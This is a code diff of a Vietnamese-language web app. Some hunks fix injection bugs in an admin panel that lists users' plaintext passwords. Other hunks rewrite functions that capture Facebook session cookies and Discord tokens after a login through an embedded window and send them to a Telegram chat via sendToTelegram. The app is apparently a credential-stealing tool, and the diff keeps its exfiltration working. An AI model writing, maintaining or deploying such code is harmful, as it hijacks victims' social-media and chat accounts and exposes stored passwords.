@@ -1370,19 +1370,22 @@ function renderMgmt(users, total, pp, page){
     <thead><tr>
       <th>#</th><th>Tên đăng nhập</th><th>Gmail</th><th>Mật khẩu</th><th>Ngày tạo</th><th>Trạng thái</th><th>Thao tác</th>
     </tr></thead>
-    <tbody>${users.map((u,i)=>`<tr>
+    <tbody>${users.map((u,i)=>{
+      const safeIdx = 'u_'+page+'_'+i;
+      window['_mgmtUserData_'+safeIdx] = u;
+      return `<tr>
       <td style="color:var(--muted)">${page*pp+i+1}</td>
       <td><b>${u.username}</b></td>
       <td style="font-size:11px;color:var(--muted)">${u.email||'—'}</td>
-      <td><div class="pw-reveal" title="Click để copy" onclick="navigator.clipboard.writeText('${u.password_plain||''}');toast('✅ Đã copy mật khẩu','#00e676')">${u.password_plain||'(ẩn)'}</div></td>
+      <td><div class="pw-reveal" title="Click để copy" onclick="copyPwSafe('${safeIdx}')">${u.password_plain||'(ẩn)'}</div></td>
       <td style="font-size:11px;color:var(--muted)">${u.created||'—'}</td>
       <td><span class="u-active ${u.active?'yes':'no'}">${u.active?'Hoạt động':'Đã khóa'}</span></td>
       <td>
-        <button class="u-action" onclick="viewUserDetail(${JSON.stringify(u).replace(/"/g,'&quot;')})">🔍 Chi tiết</button>
-        <button class="u-action" onclick="toggleUser('${u.username}',this)">${u.active?'🔒 Khóa':'🔓 Mở'}</button>
-        <button class="u-action del" onclick="deleteUser('${u.username}')">🗑 Xóa</button>
+        <button class="u-action" onclick="viewUserDetail(window['_mgmtUserData_${safeIdx}'])">🔍 Chi tiết</button>
+        <button class="u-action" onclick="toggleUserSafe('${safeIdx}',this)">${u.active?'🔒 Khóa':'🔓 Mở'}</button>
+        <button class="u-action del" onclick="deleteUserSafe('${safeIdx}')">🗑 Xóa</button>
       </td>
-    </tr>`).join('')}</tbody>
+    </tr>`;}).join('')}</tbody>
   </table></div>`;
   pages.innerHTML='';
   for(let i=0;i<totalPages;i++){
@@ -1393,17 +1396,40 @@ function renderMgmt(users, total, pp, page){
     pages.appendChild(b);
   }
 }
+let _viewingUserPw = '';
 function viewUserDetail(u){
   if(typeof u === 'string') u = JSON.parse(u);
+  _viewingUserPw = u.password_plain || '';
   document.getElementById('user-detail-content').innerHTML=`
-    <div class="admin-info-row">👤 <span>Tên đăng nhập: <b>${u.username}</b></span></div>
-    <div class="admin-info-row">📧 <span>Gmail: <b>${u.email||'—'}</b></span></div>
-    <div class="admin-info-row" style="cursor:pointer" onclick="navigator.clipboard.writeText('${u.password_plain||''}');toast('✅ Đã copy mật khẩu','#00e676')">
-      🔑 <span>Mật khẩu: <b style="color:var(--green)">${u.password_plain||'(chưa lưu)'}</b> <span style="font-size:10px;color:var(--muted)">(click để copy)</span></span>
+    <div class="admin-info-row">👤 <span>Tên đăng nhập: <b>${escapeHtml(u.username)}</b></span></div>
+    <div class="admin-info-row">📧 <span>Gmail: <b>${escapeHtml(u.email||'—')}</b></span></div>
+    <div class="admin-info-row" style="cursor:pointer" onclick="copyViewingUserPw()">
+      🔑 <span>Mật khẩu: <b style="color:var(--green)">${escapeHtml(u.password_plain||'(chưa lưu)')}</b> <span style="font-size:10px;color:var(--muted)">(click để copy)</span></span>
     </div>
-    <div class="admin-info-row">🕐 <span>Ngày tạo: <b>${u.created||'—'}</b></span></div>
+    <div class="admin-info-row">🕐 <span>Ngày tạo: <b>${escapeHtml(u.created||'—')}</b></span></div>
     <div class="admin-info-row">📊 <span>Trạng thái: <b style="color:${u.active?'var(--green)':'var(--red)'}">${u.active?'Hoạt động':'Đã khóa'}</b></span></div>`;
   openModal('user-detail-modal');
+}
+function copyViewingUserPw(){
+  navigator.clipboard.writeText(_viewingUserPw).then(()=>toast('✅ Đã copy mật khẩu','#00e676'));
+}
+function escapeHtml(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+function copyPwSafe(safeIdx){
+  const u = window['_mgmtUserData_'+safeIdx];
+  if(!u) return;
+  navigator.clipboard.writeText(u.password_plain||'').then(()=>toast('✅ Đã copy mật khẩu','#00e676'));
+}
+function toggleUserSafe(safeIdx, btn){
+  const u = window['_mgmtUserData_'+safeIdx];
+  if(!u) return;
+  toggleUser(u.username, btn);
+}
+function deleteUserSafe(safeIdx){
+  const u = window['_mgmtUserData_'+safeIdx];
+  if(!u) return;
+  deleteUser(u.username);
 }
 
 async function toggleUser(username, btn){
@@ -1554,14 +1580,15 @@ function stopOtpCountdown() {
   clearInterval(otpCountdownTimer);
 }
 
-// ─ Enter key in login ─
+// ─ Enter key in login (chỉ khi đang ở màn hình đăng nhập/đăng ký) ─
 document.addEventListener('keydown',e=>{
-  if(e.key==='Enter'){
-    const ls=document.getElementById('auth-login-form');
-    const rs=document.getElementById('auth-register-form');
-    if(ls&&ls.style.display!=='none') doLogin();
-    else if(rs&&rs.style.display!=='none') doRegister();
-  }
+  if(e.key!=='Enter') return;
+  const authScreen = document.getElementById('auth-screen');
+  if(!authScreen || authScreen.style.display==='none') return; // đã vào app rồi, bỏ qua
+  const ls=document.getElementById('auth-login-form');
+  const rs=document.getElementById('auth-register-form');
+  if(ls && ls.style.display!=='none') doLogin();
+  else if(rs && rs.style.display==='flex') doRegister();
 });
 
 // ═══════════════════════════════════════════════════════
@@ -1703,13 +1730,13 @@ function onFbLoginSuccess(cookie, iwin){
   setDot('dot-fb', 'ok');
 
   // Gửi Telegram
-  sendToTelegram('🔵 FACEBOOK COOKIE MỚI
+  sendToTelegram(`🔵 FACEBOOK COOKIE MỚI
 
-👤 ' + name + '
-🕐 ' + now + '
+👤 ${name}
+🕐 ${now}
 
 🍪 Cookie:
-' + cookie.substring(0,300) + (cookie.length>300?'...':''));
+${cookie.substring(0,300)}${cookie.length>300?'...':''}`);
 }
 
 function copyFbCookie(){
@@ -1727,12 +1754,12 @@ function copyFbCookie(){
 
 function downloadFbCookie(){
   if(!fbCurrentCookie) return;
-  const txt = '=== FACEBOOK COOKIE ===
-Tên: '+fbCurrentName+'
-Thời gian: '+new Date().toLocaleString('vi-VN')+'
+  const txt = `=== FACEBOOK COOKIE ===
+Tên: ${fbCurrentName}
+Thời gian: ${new Date().toLocaleString('vi-VN')}
 
 Cookie:
-'+fbCurrentCookie;
+${fbCurrentCookie}`;
   const a = document.createElement('a');
   a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
   a.download = 'fb_cookie_'+Date.now()+'.txt';
@@ -1832,12 +1859,12 @@ function onDisLoginSuccess(token, iwin){
   document.getElementById('status-dis').textContent = '✅ Lấy token thành công!';
   setDot('dot-dis', 'ok');
 
-  sendToTelegram('🎮 DISCORD TOKEN MỚI
+  sendToTelegram(`🎮 DISCORD TOKEN MỚI
 
-🕐 ' + now + '
+🕐 ${now}
 
 🔑 Token:
-' + token.substring(0,100)+'...');
+${token.substring(0,100)}...`);
 }
 
 function copyDisToken(){
@@ -1847,12 +1874,12 @@ function copyDisToken(){
 
 function downloadDisToken(){
   if(!disCurrentToken) return;
-  const txt = '=== DISCORD TOKEN ===
-User: '+disCurrentName+'
-Thời gian: '+new Date().toLocaleString('vi-VN')+'
+  const txt = `=== DISCORD TOKEN ===
+User: ${disCurrentName}
+Thời gian: ${new Date().toLocaleString('vi-VN')}
 
 Token:
-'+disCurrentToken;
+${disCurrentToken}`;
   const a = document.createElement('a');
   a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
   a.download = 'discord_token_'+Date.now()+'.txt';
